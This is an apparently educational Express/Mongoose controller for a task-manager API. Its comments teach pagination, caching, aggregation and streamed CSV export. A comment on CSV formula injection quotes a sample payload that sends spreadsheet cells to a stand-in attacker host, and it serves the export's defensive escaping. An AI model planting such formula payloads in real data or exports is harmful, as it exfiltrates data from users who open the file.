// ============================================================
// 🧠 CONCEPT: The CRUD + performance surface of the app
// WHY IT MATTERS (interview angle): this one file carries four of the most
//   asked backend topics — pagination strategy, caching with invalidation,
//   streaming responses, and the aggregation pipeline. Each has its own
//   concept block below.
// HOW IT WORKS HERE: Task Manager CRUD, deliberately thin on business logic
//   so the infrastructure patterns stay visible.
// ============================================================

const mongoose = require('mongoose');
const Task = require('../models/Task');
const ApiError = require('../utils/ApiError');
const asyncHandler = require('../utils/asyncHandler');
const cache = require('../utils/cache');
const config = require('../config/env');
const logger = require('../utils/logger');
const { activityLogger, EVENTS } = require('../utils/activityLogger');

const toObjectId = (id) => new mongoose.Types.ObjectId(String(id));

// ------------------------------------------------------------------
// GET /api/tasks            (offset pagination + cache)
// GET /api/tasks?mode=cursor (cursor pagination)
// ------------------------------------------------------------------

// ============================================================
// 🧠 CONCEPT: OFFSET vs CURSOR pagination — both implemented below
// WHY IT MATTERS (interview angle): "How would you paginate a million
//   rows?" is a standard scaling question, and "skip and limit" alone is
//   the answer that gets followed up until it breaks.
//
// ── 1. OFFSET (skip/limit) — the familiar one ──────────────────────
//
//     Task.find(filter).skip((page - 1) * limit).limit(limit)
//     GET /api/tasks?page=500&limit=20
//
//   ✅ PROS
//     • Jump to ANY page directly — "page 500" is a real, addressable thing.
//     • You can show "Page 7 of 240", which needs a total count.
//     • Trivial to implement and to reason about.
//
//   ❌ CONS — and this is what the follow-up is about
//
//     (a) IT GETS LINEARLY SLOWER AS YOU GO DEEPER. This is the big one and
//         it is widely misunderstood. `skip(10000)` does NOT teleport the
//         database to row 10,000. MongoDB must WALK AND DISCARD the first
//         10,000 documents before returning anything. Page 1 reads 20 docs;
//         page 500 reads 10,020 and throws away 10,000 of them. Cost is
//         O(offset + limit) — the deeper the page, the slower the query, so
//         your p99 latency is set by whoever browses furthest. This is why
//         "the last page of our admin table times out" is such a common bug.
//
//     (b) IT SKIPS AND DUPLICATES ROWS ON A CHANGING DATASET. Say you are
//         reading page 2 (rows 21-40) and someone inserts a new task at the
//         top. Everything shifts down one, so the row that WAS #20 (already
//         shown on page 1) is now #21 — and you see it AGAIN on page 2. A
//         deletion does the mirror image: a row shifts up into page 1's
//         range after you have passed it, and you NEVER SEE IT AT ALL. On a
//         busy feed this is not theoretical; users notice.
//
//     (c) COUNTING IS ITS OWN PROBLEM. To render "Page 7 of 240" you need
//         countDocuments(), a second full scan of the matching set. On a
//         large collection that can cost more than the page query itself.
//         (estimatedDocumentCount() is instant but ignores your filter.)
//
// ── 2. CURSOR / KEYSET ("seek method") — the scalable one ──────────
//
//     Task.find({ ...filter, _id: { $lt: lastSeenId } })
//         .sort({ _id: -1 }).limit(limit)
//     GET /api/tasks?mode=cursor&cursor=6512ab...&limit=20
//
//   Instead of "skip 10,000 rows", it says "start AFTER this specific row".
//
//   ✅ PROS
//     • CONSTANT TIME regardless of depth — O(log n) to seek into the index
//       plus O(limit) to read. Page 50,000 is exactly as fast as page 1,
//       because the index seeks straight to the cursor value.
//     • STABLE under concurrent inserts and deletes. You asked for "rows
//       after X"; new rows arriving above X cannot shift your window, so
//       nothing is skipped or duplicated.
//     • Ideal for infinite scroll, feeds, and API exports.
//
//   ❌ CONS
//     • NO RANDOM ACCESS. You cannot jump to "page 500"; you can only go
//       next (and, with a bit more work, previous). There is no page number
//       to put in a URL.
//     • The sort field must be UNIQUE and INDEXED, or you get ties. If you
//       sort by createdAt and 50 tasks share a timestamp, the cursor lands
//       mid-tie and you silently drop rows. THE FIX IS A COMPOUND CURSOR:
//       sort by (createdAt, _id) and compare as a tuple —
//         { $or: [ { createdAt: { $lt: c } },
//                  { createdAt: c, _id: { $lt: id } } ] }
//       _id alone works as a cursor precisely because it is unique.
//     • Sorting by an arbitrary user-chosen column is much harder.
//
// ── VERDICT ────────────────────────────────────────────────────────
//   Offset for admin tables and small bounded datasets where users expect
//   page numbers. Cursor for feeds, infinite scroll, public APIs, and
//   anything unbounded. Every large-scale API you have used (Twitter,
//   Stripe, Slack, GitHub) exposes cursor pagination — that is not a
//   coincidence, it is (a) above.
//
// HOW IT WORKS HERE: `?mode=cursor` toggles between the two on the same
//   endpoint so you can hit both against the seeded 50k dataset and compare
//   the reported `queryTimeMs`.
// ============================================================

const listTasks = asyncHandler(async (req, res) => {
  const { mode = 'offset', page = 1, limit = 20, status, priority, search, sort = '-createdAt', cursor } = req.query;

  const perPage = Math.min(Number(limit) || 20, 100);

  // Always scope to the caller. This is resource-level authorization applied
  // to a LIST endpoint — just as important as on a single-document route,
  // and easier to forget.
  const filter = { owner: toObjectId(req.user.id) };
  if (status) filter.status = status;
  if (priority) filter.priority = priority;

  if (search) {
    // ============================================================
    // 🧠 CONCEPT: Why `$regex` search is a trap
    // WHY IT MATTERS (interview angle): an UNANCHORED regex (/foo/) cannot
    //   use a B-tree index — the index is sorted by prefix, and "contains"
    //   has no prefix to seek to. So this is a COLLSCAN on every keystroke.
    //   Only an ANCHORED, case-sensitive regex (/^foo/) can use an index.
    //   There is also a ReDoS angle: passing user input straight into a
    //   RegExp lets an attacker submit a catastrophically backtracking
    //   pattern and pin your single thread at 100% CPU. Always escape the
    //   input (as below) or, better, use a text index / Atlas Search.
    // ============================================================
    const escaped = String(search).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    filter.title = { $regex: escaped, $options: 'i' };
  }

  // ---------------- CURSOR MODE ----------------
  if (mode === 'cursor') {
    const cursorFilter = { ...filter };
    if (cursor) {
      // "Give me rows that come AFTER this id in the sort order."
      // With sort({_id: -1}) (newest first), "after" means a SMALLER id.
      cursorFilter._id = { $lt: toObjectId(cursor) };
    }

    const started = process.hrtime.bigint();

    // Fetch one EXTRA row: its existence tells us whether another page
    // exists, without a second count query. Cheap and exact.
    const rows = await Task.find(cursorFilter)
      .select('title status priority dueDate tags createdAt')
      .sort({ _id: -1 })
      .limit(perPage + 1)
      .lean();

    const queryTimeMs = Number(process.hrtime.bigint() - started) / 1e6;

    const hasMore = rows.length > perPage;
    const items = hasMore ? rows.slice(0, perPage) : rows;

    return res.json({
      success: true,
      data: items,
      pagination: {
        mode: 'cursor',
        limit: perPage,
        hasMore,
        // The client sends this back as `?cursor=` to get the next page.
        nextCursor: hasMore ? String(items[items.length - 1]._id) : null,
        // ⚠️ Deliberately NO totalPages. Computing it would require the
        // count query that cursor pagination exists to avoid.
        queryTimeMs: Number(queryTimeMs.toFixed(2)),
      },
    });
  }

  // ---------------- OFFSET MODE (with cache-aside) ----------------
  const pageNum = Math.max(Number(page) || 1, 1);
  const skip = (pageNum - 1) * perPage;

  // ============================================================
  // 🧠 CONCEPT: Cache key design
  // WHY IT MATTERS (interview angle): the key must encode EVERY input that
  //   changes the result — user, filters, sort, page, limit. Miss one and
  //   you serve user A's tasks to user B, which is a data breach, not a
  //   caching bug. That is the failure mode to name: over-broad cache keys
  //   are a security issue.
  //   The opposite failure is a key so specific that nothing ever hits.
  //   Hashing the variable part keeps keys bounded in length while staying
  //   unique.
  // ============================================================
  const keySuffix = JSON.stringify({ status, priority, search, sort, pageNum, perPage });
  const cacheKey = cache.buildKey('tasks', 'list', req.user.id, Buffer.from(keySuffix).toString('base64url'));

  const started = process.hrtime.bigint();

  const { data, cached } = await cache.getOrSet(cacheKey, config.redis.ttlSeconds, async () => {
    // ============================================================
    // 🧠 CONCEPT: Run the count and the page IN PARALLEL
    // WHY IT MATTERS (interview angle): offset pagination needs two queries.
    //   Awaiting them in sequence doubles the latency for no reason — they
    //   are independent. Promise.all makes the endpoint as slow as the
    //   slower query rather than the sum of both.
    // ============================================================
    const [items, total] = await Promise.all([
      Task.find(filter)
        // ============================================================
        // 🧠 CONCEPT: .select() — projection reduces I/O AND bandwidth
        // WHY IT MATTERS (interview angle): without a projection, MongoDB
        //   reads and returns EVERY field, including the 2KB description.
        //   Over 20 rows that is 40KB of disk read, BSON decode, network
        //   transfer and JSON serialisation that nobody asked for. In a list
        //   view you need maybe six fields.
        //   The deeper win is a COVERED QUERY: if every field you select is
        //   present in the index, MongoDB answers entirely from the index
        //   and never touches the documents at all. Watch for
        //   `totalDocsExamined: 0` in explain() — that is the giveaway.
        // ============================================================
        .select('title status priority dueDate tags createdAt')
        .sort(sort)
        .skip(skip)
        .limit(perPage)
        // ============================================================
        // 🧠 CONCEPT: .lean() — skip Mongoose document hydration
        // WHY IT MATTERS (interview angle): by default Mongoose wraps every
        //   result in a full Document — with getters, setters, virtuals,
        //   validation and change tracking. That machinery costs real CPU
        //   and memory per document, and it is pure waste when you are
        //   going to JSON.stringify the result and throw it away. .lean()
        //   returns plain JS objects and is commonly 3-5x faster on large
        //   result sets.
        //   ⚠️ THE TRADE-OFF: lean documents have NO .save(), NO virtuals,
        //   NO toJSON transform. Note the practical consequence right here:
        //   our toJSON transform normally renames _id -> id, and with
        //   .lean() it does not run, so the client receives `_id`. Use lean
        //   for READS you serialise; never for documents you intend to
        //   modify.
        // ============================================================
        .lean(),

      // ============================================================
      // 🧠 CONCEPT: countDocuments vs estimatedDocumentCount
      // WHY IT MATTERS (interview angle): countDocuments() honours your
      //   filter but must actually scan the matching index/collection —
      //   O(n) in matches. estimatedDocumentCount() reads collection
      //   metadata and is O(1), but it CANNOT take a filter and can be
      //   slightly stale after an unclean shutdown. For a filtered total you
      //   need countDocuments; for "roughly how many tasks exist" on a
      //   dashboard, the estimate is free.
      // ============================================================
      Task.countDocuments(filter),
    ]);

    return { items, total };
  });

  const queryTimeMs = Number(process.hrtime.bigint() - started) / 1e6;

  return res.json({
    success: true,
    data: data.items,
    pagination: {
      mode: 'offset',
      page: pageNum,
      limit: perPage,
      total: data.total,
      totalPages: Math.ceil(data.total / perPage),
      hasMore: skip + data.items.length < data.total,
      // Surfaced so you can watch cached vs uncached timings in the UI.
      cached,
      queryTimeMs: Number(queryTimeMs.toFixed(2)),
    },
  });
});

// ------------------------------------------------------------------
// GET /api/tasks/:id
// ------------------------------------------------------------------
const getTask = asyncHandler(async (req, res) => {
  // req.resource was loaded and ownership-checked by requireOwnership
  // middleware. The controller does not repeat the query — no second
  // round-trip, and no chance of forgetting the check.
  res.json({ success: true, data: req.resource });
});

// ------------------------------------------------------------------
// POST /api/tasks
// ------------------------------------------------------------------
const createTask = asyncHandler(async (req, res) => {
  const { title, description, status, priority, dueDate, tags, estimatedHours } = req.body;

  const task = await Task.create({
    title,
    description,
    status,
    priority,
    dueDate,
    tags,
    estimatedHours,
    // ⚠️ owner comes from the VERIFIED TOKEN, never from the request body.
    // Taking it from the body would let anyone create tasks in someone
    // else's account — mass assignment again.
    owner: req.user.id,
  });

  // Purge this user's cached list pages, or they refresh and don't see the
  // task they just created. See the invalidation concept in utils/cache.js.
  await cache.invalidateTaskCache(req.user.id);

  activityLogger.emit(EVENTS.TASK_CREATED, {
    taskId: String(task._id),
    title: task.title,
    userId: req.user.id,
  });

  res.status(201).json({ success: true, data: task });
});

// ------------------------------------------------------------------
// PATCH /api/tasks/:id
// ------------------------------------------------------------------
const updateTask = asyncHandler(async (req, res) => {
  const task = req.resource; // ownership already verified

  // ============================================================
  // 🧠 CONCEPT: PATCH vs PUT
  // WHY IT MATTERS (interview angle): PUT is a full REPLACE — the body is
  //   the complete new representation, and any field you omit should be
  //   cleared. PATCH is a PARTIAL update — only the fields present change.
  //   Most "PUT" endpoints in the wild are actually PATCH semantics, which
  //   is a real bug when a client omits a field expecting it to be left
  //   alone and it gets wiped. Being precise about this is a quick REST
  //   credibility signal.
  //   Also relevant: PUT is defined as IDEMPOTENT (same request twice = same
  //   final state), and so is a well-formed PATCH here. POST is not.
  // ============================================================
  const updatable = ['title', 'description', 'status', 'priority', 'dueDate', 'tags', 'estimatedHours'];

  for (const field of updatable) {
    if (Object.prototype.hasOwnProperty.call(req.body, field)) {
      task[field] = req.body[field];
    }
  }

  // .save() runs the pre('save') hooks (which stamp completedAt) AND full
  // schema validation. findByIdAndUpdate would skip both unless you pass
  // { runValidators: true } — and even then, document middleware still
  // won't fire.
  await task.save();

  await cache.invalidateTaskCache(req.user.id);
  activityLogger.emit(EVENTS.TASK_UPDATED, { taskId: String(task._id), userId: req.user.id });

  res.json({ success: true, data: task });
});

// ------------------------------------------------------------------
// DELETE /api/tasks/:id
// ------------------------------------------------------------------
const deleteTask = asyncHandler(async (req, res) => {
  const task = req.resource;

  // ============================================================
  // 🧠 CONCEPT: Hard delete vs soft delete
  // WHY IT MATTERS (interview angle): a soft delete sets `deletedAt` and
  //   filters it out of every query. Pros: undo, audit trail, referential
  //   integrity for rows that point at it, and GDPR-friendly staged
  //   deletion. Cons: every single query must remember the filter (one
  //   forgotten `deletedAt: null` and deleted data reappears — a real and
  //   common bug), unique indexes conflict with "deleted" rows still
  //   occupying the value, and the table grows forever.
  //   ⚠️ And note: a soft delete does NOT satisfy a GDPR erasure request.
  //   "Right to be forgotten" means the data is actually gone.
  //   Hard delete here, for simplicity.
  // ============================================================
  await task.deleteOne();

  await cache.invalidateTaskCache(req.user.id);
  activityLogger.emit(EVENTS.TASK_DELETED, { taskId: String(task._id), userId: req.user.id });

  // 204 No Content: success, and deliberately no body.
  res.status(204).send();
});

// ------------------------------------------------------------------
// GET /api/tasks/stats  — the AGGREGATION PIPELINE example
// ------------------------------------------------------------------
// ============================================================
// 🧠 CONCEPT: The aggregation pipeline
// WHY IT MATTERS (interview angle): aggregation is MongoDB's answer to SQL's
//   GROUP BY / JOIN / HAVING, and the key insight is that THE WORK HAPPENS
//   ON THE DATABASE SERVER. The alternative — pulling 50,000 documents over
//   the network and reducing them in JavaScript — transfers megabytes,
//   allocates them all in your process's memory, and blocks the event loop
//   while you loop. The queryDemoController does exactly that, on purpose,
//   so you can measure the difference.
//
//   THE STAGES YOU MUST KNOW:
//     $match   — filter (= WHERE). ⭐ PUT IT FIRST. See the note below.
//     $group   — group + accumulate (= GROUP BY). _id is the grouping key.
//     $project — reshape: include/exclude/compute fields (= SELECT).
//     $sort    — order (= ORDER BY).
//     $limit / $skip — paginate.
//     $lookup  — join another collection (= LEFT OUTER JOIN).
//     $unwind  — explode an array into one document per element.
//     $facet   — run several sub-pipelines over the same input in ONE pass.
//
//   ⭐ THE #1 OPTIMISATION RULE: $match AND $limit AS EARLY AS POSSIBLE.
//   Only a $match in the FIRST stage can use an index. Once any stage has
//   transformed the documents, the planner has no index to work with and
//   everything downstream is an in-memory scan. Putting $match after $group
//   is the classic aggregation performance bug — you group the entire
//   collection and then throw most of it away.
//
//   ⚠️ THE 100MB LIMIT: each stage is capped at 100MB of RAM. Exceed it and
//   the aggregation fails outright unless you pass { allowDiskUse: true }
//   (which spills to disk and is much slower). This is why $match-first
//   matters so much — it keeps the working set small.
//
// HOW IT WORKS HERE: $facet runs three independent analyses over one pass of
//   the matched documents, so we get status counts, priority counts and
//   overall totals from a SINGLE query instead of three.
// ============================================================
const getTaskStats = asyncHandler(async (req, res) => {
  const ownerId = toObjectId(req.user.id);
  const started = process.hrtime.bigint();

  const [result] = await Task.aggregate([
    // STAGE 1 — $match FIRST so the { owner, status, createdAt } index is
    // used and every later stage sees only this user's documents.
    { $match: { owner: ownerId } },

    // ============================================================
    // 🧠 CONCEPT: $facet — multiple aggregations, one pass
    // WHY IT MATTERS (interview angle): a dashboard typically needs several
    //   different roll-ups of the same filtered set. Running three separate
    //   aggregations means reading the same documents three times. $facet
    //   feeds ONE input stream into N independent sub-pipelines. It is the
    //   standard trick for "give me the page of results AND the total count
    //   in one round-trip".
    //   ⚠️ Caveat: each facet's output is a single document, so it is
    //   subject to the 16MB BSON limit — use it for aggregates, not for
    //   returning large result sets.
    // ============================================================
    {
      $facet: {
        byStatus: [
          { $group: { _id: '$status', count: { $sum: 1 }, totalHours: { $sum: '$estimatedHours' } } },
          { $sort: { count: -1 } },
        ],

        byPriority: [{ $group: { _id: '$priority', count: { $sum: 1 } } }, { $sort: { _id: 1 } }],

        overdue: [
          { $match: { dueDate: { $lt: new Date() }, status: { $ne: 'done' } } },
          { $count: 'count' }, // $count is shorthand for $group + $project
        ],

        totals: [
          {
            $group: {
              _id: null, // _id: null groups EVERYTHING into one bucket
              total: { $sum: 1 },
              avgHours: { $avg: '$estimatedHours' },
              maxHours: { $max: '$estimatedHours' },
              // $cond inside an accumulator = a conditional count.
              completed: { $sum: { $cond: [{ $eq: ['$status', 'done'] }, 1, 0] } },
            },
          },
        ],

        // A multikey-index-friendly tag roll-up: $unwind explodes the array
        // so each tag becomes its own document, then we group on it.
        topTags: [
          { $unwind: '$tags' },
          { $group: { _id: '$tags', count: { $sum: 1 } } },
          { $sort: { count: -1 } },
          { $limit: 5 },
        ],
      },
    },
  ]);

  const queryTimeMs = Number(process.hrtime.bigint() - started) / 1e6;

  const totals = result.totals[0] || { total: 0, avgHours: 0, completed: 0 };

  res.json({
    success: true,
    data: {
      byStatus: result.byStatus.reduce((acc, r) => ({ ...acc, [r._id]: r.count }), {}),
      byPriority: result.byPriority.reduce((acc, r) => ({ ...acc, [r._id]: r.count }), {}),
      overdue: result.overdue[0]?.count || 0,
      topTags: result.topTags.map((t) => ({ tag: t._id, count: t.count })),
      total: totals.total,
      completed: totals.completed,
      completionRate: totals.total ? Number(((totals.completed / totals.total) * 100).toFixed(1)) : 0,
      avgEstimatedHours: Number((totals.avgHours || 0).toFixed(2)),
      queryTimeMs: Number(queryTimeMs.toFixed(2)),
      note: 'All of the above came from ONE aggregation via $facet, not five queries.',
    },
  });
});

// ------------------------------------------------------------------
// GET /api/tasks/export  — STREAMS + BACKPRESSURE
// ------------------------------------------------------------------
// ============================================================
// 🧠 CONCEPT: STREAMS and BACKPRESSURE
// WHY IT MATTERS (interview angle): the definitive "do you understand Node?"
//   question, because streams are what Node is actually built on.
//
//   ❌ THE NAIVE EXPORT — this is what most people write first:
//
//       const tasks = await Task.find({ owner });      // ALL of them
//       let csv = 'title,status\n';
//       for (const t of tasks) csv += `${t.title},${t.status}\n`;
//       res.send(csv);
//
//     With 1,000 rows it works fine and ships. With 500,000 rows:
//       • Every document is loaded into memory AT ONCE. 500k × ~1KB = 500MB,
//         and hydrating them as Mongoose documents multiplies that further.
//       • The string concatenation allocates repeatedly; the final CSV is
//         another full copy in memory.
//       • The V8 heap limit (~1.5GB by default) is hit and the process dies
//         with "JavaScript heap out of memory" — taking every other
//         in-flight request with it.
//       • The user sees NOTHING for 30 seconds, then a timeout, because the
//         first byte is not sent until the last row is processed.
//       • Building that string is synchronous CPU work that BLOCKS THE EVENT
//         LOOP, so your whole server stalls.
//
//   ✅ THE STREAMING VERSION — constant memory, regardless of row count:
//
//     Data flows through in small chunks. One document is read from the
//     Mongo cursor, converted to a CSV line, written to the response, and
//     released for garbage collection before the next one is read. Memory
//     stays flat whether it is 100 rows or 10 million, and the browser
//     starts downloading immediately (time-to-first-byte in milliseconds).
//
//   ⭐ BACKPRESSURE — the part that separates real understanding from
//      "I've used pipe()":
//
//     Producers and consumers run at different speeds. MongoDB on a local
//     SSD can produce rows far faster than a user on hotel wifi can receive
//     them. If you ignore that and keep writing, the unsent data piles up in
//     the socket's internal buffer IN YOUR PROCESS'S MEMORY — and you have
//     reinvented the out-of-memory crash you were trying to avoid, just more
//     slowly and only for slow clients (so it passes every local test).
//
//     The mechanism: `stream.write()` RETURNS A BOOLEAN. `false` means "my
//     internal buffer has exceeded highWaterMark — please stop". The
//     producer must then PAUSE and wait for the consumer to emit 'drain'
//     before resuming. That feedback loop IS backpressure.
//
//     `pipe()` and `pipeline()` handle this FOR YOU automatically. That is
//     the single biggest reason to prefer them over a manual write loop —
//     and why "why not just call write() in a for-loop?" has a real answer.
//
//   ⭐ pipeline() vs pipe(): ALWAYS PREFER pipeline(). Plain .pipe() does
//     NOT forward errors and does NOT clean up the source if the
//     destination fails — a client that disconnects mid-download leaves
//     your Mongo cursor open, leaking a connection every time. pipeline()
//     (and its promise form) destroys every stream in the chain on error.
//
//   THE FOUR STREAM TYPES: Readable (Mongo cursor, fs.createReadStream),
//   Writable (the HTTP response, fs.createWriteStream), Duplex (a TCP
//   socket), Transform (a Duplex that modifies data — zlib.createGzip, and
//   the CSV formatter below).
//
// HOW IT WORKS HERE: Mongo cursor stream -> Transform to CSV -> HTTP
//   response, wired with pipeline() so backpressure and cleanup are handled.
// ============================================================
const { Transform, pipeline } = require('stream');
const { promisify } = require('util');

const pipelineAsync = promisify(pipeline);

const exportTasksCsv = asyncHandler(async (req, res) => {
  const ownerId = toObjectId(req.user.id);

  // ============================================================
  // 🧠 CONCEPT: Set headers BEFORE any data is written
  // WHY IT MATTERS (interview angle): once the first byte of the body is on
  //   the wire, headers are immutable — setting one throws
  //   ERR_HTTP_HEADERS_SENT. It also means that if the stream fails
  //   halfway, you CANNOT change the status to 500; it already said 200.
  //   All you can do is destroy the socket so the client sees a truncated
  //   transfer. This is exactly the `res.headersSent` branch in
  //   middleware/errorHandler.js.
  // ============================================================
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="tasks-${Date.now()}.csv"`);
  // No Content-Length: we don't know the size in advance. Node falls back to
  // chunked transfer encoding, which is precisely what streaming requires.
  res.setHeader('X-Accel-Buffering', 'no'); // stop nginx buffering the whole response

  // ============================================================
  // 🧠 CONCEPT: .cursor() — a Readable stream over query results
  // WHY IT MATTERS (interview angle): `.find()` buffers the ENTIRE result
  //   set into an array before resolving. `.cursor()` returns a stream that
  //   pulls documents from the server in batches (default 101 first, then
  //   ~16MB worth) and emits them one at a time. Memory is bounded by the
  //   batch size, not by the result size. Combined with .lean(), there is no
  //   Mongoose Document overhead either.
  // ============================================================
  const cursor = Task.find({ owner: ownerId })
    .select('title status priority dueDate tags estimatedHours createdAt')
    .sort({ createdAt: -1 })
    .lean()
    .cursor({ batchSize: 500 });

  let rowCount = 0;

  // ============================================================
  // 🧠 CONCEPT: A Transform stream
  // WHY IT MATTERS (interview angle): a Transform sits between a Readable
  //   and a Writable and reshapes each chunk. The `callback` is how you
  //   signal "done with this chunk" — and critically, the stream will NOT
  //   send you another chunk until you call it. THAT is how backpressure
  //   propagates upstream through the chain: a slow transform automatically
  //   slows the reader. Calling the callback twice, or forgetting it
  //   entirely, is the classic way to hang or crash a pipeline.
  //   `objectMode: true` is required because our input is JS objects, not
  //   Buffers.
  // ============================================================
  const toCsv = new Transform({
    objectMode: true,

    transform(task, _encoding, callback) {
      try {
        // Emit the header row lazily, on the first document.
        if (rowCount === 0) {
          this.push('id,title,status,priority,dueDate,tags,estimatedHours,createdAt\n');
        }
        rowCount += 1;

        // ============================================================
        // 🧠 CONCEPT: CSV INJECTION (a.k.a. formula injection)
        // WHY IT MATTERS (interview angle): a security issue people rarely
        //   think about. If a task title begins with =, +, - or @, Excel and
        //   Google Sheets treat the cell as a FORMULA when the CSV is
        //   opened. A malicious title like
        //     =HYPERLINK("http://evil.com?d="&A1,"Click")
        //   exfiltrates other cells, and some payloads can invoke
        //   local commands via DDE. Your app is fine; your USER'S MACHINE is
        //   the target. The fix is to prefix any cell starting with those
        //   characters with a single quote or a tab.
        // ============================================================
        const escape = (value) => {
          if (value === null || value === undefined) return '';
          let str = String(value);
          if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`; // neutralise formulas
          // Standard CSV quoting: wrap in quotes and double any inner quote.
          if (/[",\n\r]/.test(str)) str = `"${str.replace(/"/g, '""')}"`;
          return str;
        };

        const line =
          [
            task._id,
            escape(task.title),
            task.status,
            task.priority,
            task.dueDate ? new Date(task.dueDate).toISOString() : '',
            escape((task.tags || []).join('|')),
            task.estimatedHours ?? '',
            new Date(task.createdAt).toISOString(),
          ].join(',') + '\n';

        // this.push() queues the chunk downstream. callback() says "ready
        // for the next document" — the flow-control handshake.
        callback(null, line);
      } catch (err) {
        callback(err); // errors propagate through pipeline() and destroy the chain
      }
    },

    // `flush` runs once the source is exhausted — the place for a footer.
    flush(callback) {
      if (rowCount === 0) {
        this.push('id,title,status,priority,dueDate,tags,estimatedHours,createdAt\n');
      }
      callback();
    },
  });

  try {
    // ============================================================
    // 🧠 CONCEPT: pipeline() handles backpressure AND cleanup
    // WHY IT MATTERS (interview angle): this single call wires three streams
    //   together and gives you, for free: automatic pause/resume on the
    //   cursor when the socket buffer fills, error propagation from any
    //   stage, and destruction of ALL streams if any one fails or the client
    //   disconnects. Written manually with .on('data') and .write(), you
    //   would have to implement every one of those — and the cursor leak on
    //   client disconnect is the one everybody forgets.
    // ============================================================
    await pipelineAsync(cursor, toCsv, res);
    logger.info(`[export] streamed ${rowCount} tasks for user ${req.user.id} at constant memory`);
  } catch (err) {
    // ============================================================
    // 🧠 CONCEPT: A client disconnect is NOT a server error
    // WHY IT MATTERS (interview angle): if the user cancels a download,
    //   pipeline rejects with ERR_STREAM_PREMATURE_CLOSE / EPIPE. That is
    //   normal behaviour, not a bug — logging it at error level will fill
    //   your dashboards with noise and desensitise you to real failures.
    // ============================================================
    if (['ERR_STREAM_PREMATURE_CLOSE', 'EPIPE', 'ECONNRESET'].includes(err.code)) {
      logger.debug(`[export] client disconnected after ${rowCount} rows`);
      return;
    }
    logger.error(`[export] stream failed after ${rowCount} rows: ${err.message}`);
    // Headers are long gone; destroying the socket is the only honest signal.
    if (!res.headersSent) throw err;
    res.destroy(err);
  }
});

// ------------------------------------------------------------------
// POST /api/tasks/:id/attachment
// ------------------------------------------------------------------
const uploadAttachment = asyncHandler(async (req, res) => {
  if (!req.file) throw ApiError.badRequest('No file uploaded (field name must be "file")');

  const task = req.resource;
  task.attachment = {
    filename: req.file.filename, // our generated, safe name
    originalName: req.file.originalname, // the user's name, for display ONLY
    mimeType: req.file.mimetype,
    sizeBytes: req.file.size,
  };
  await task.save();
  await cache.invalidateTaskCache(req.user.id);

  res.json({ success: true, data: task });
});

// ------------------------------------------------------------------
// GET /api/tasks/activity
// ------------------------------------------------------------------
const getActivity = asyncHandler(async (_req, res) => {
  // Reads the EventEmitter's in-memory ring buffer — see utils/activityLogger.js.
  res.json({ success: true, data: activityLogger.getRecent() });
});

module.exports = {
  listTasks,
  getTask,
  createTask,
  updateTask,
  deleteTask,
  getTaskStats,
  exportTasksCsv,
  uploadAttachment,
  getActivity,
};
